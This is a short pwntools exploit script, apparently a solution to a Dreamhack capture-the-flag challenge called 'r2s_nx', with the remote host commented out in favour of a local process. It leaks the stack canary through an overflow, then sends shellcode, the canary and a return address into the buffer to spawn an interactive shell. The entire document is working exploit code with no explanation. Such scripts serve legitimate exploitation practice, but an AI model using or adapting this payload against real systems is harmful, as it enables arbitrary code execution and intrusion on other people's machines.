from pwn import *
context_log_level = 'debug'
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())

# p = remote('host3.dreamhack.games', 12434)
p = process('./r2s_nx')

p.recvuntil(b'Address of the buf: ')
buf_addr = int(p.recvn(14), 16)
p.recvuntil(b'Distance between buf and $rbp: ')
buf2rbp = int(p.recvline().split()[0])
buf2canary = buf2rbp - 8

payload = b'A' * (buf2canary + 1)
p.sendafter(b'Input: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))

payload = shellcode
payload += b'A' * (buf2canary - len(shellcode))
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(buf_addr)

p.sendafter(b'Input: ', payload)

p.interactive()